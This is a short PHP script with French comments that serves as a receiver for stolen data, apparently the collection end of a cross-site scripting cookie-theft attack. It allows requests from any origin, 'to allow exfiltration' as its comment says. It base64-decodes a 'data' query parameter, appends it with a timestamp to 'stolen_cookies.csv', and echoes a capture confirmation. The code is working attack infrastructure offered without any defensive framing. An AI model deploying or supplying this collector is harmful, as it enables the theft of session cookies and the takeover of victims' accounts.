<?php
// Autoriser l'exfiltration depuis n'importe quel domaine
header("Access-Control-Allow-Origin: *");
header("Content-Type: text/plain");

// Fichier de stockage
$csv_file = 'stolen_cookies.csv';

if (isset($_GET['data'])) {
    // 1. Récupération et Décodage Base64
    $encoded_data = $_GET['data'];
    $decoded_data = base64_decode($encoded_data);

    // 2. Préparation des infos contextuelles
    $date = date('Y-m-d H:i:s');
    
    // 3. Formatage de la ligne CSV (Date, IP, Données décodées)
    $line = [$date, $decoded_data];

    // 4. Écriture sécurisée dans le fichier
    $file = fopen($csv_file, 'a');
    if ($file) {
        fputcsv($file, $line);
        fclose($file);
        echo "Capture réussie : " . $decoded_data;
    } else {
        echo "Erreur d'écriture sur le serveur.";
    }
} else {
    echo "En attente de données...";
}
?>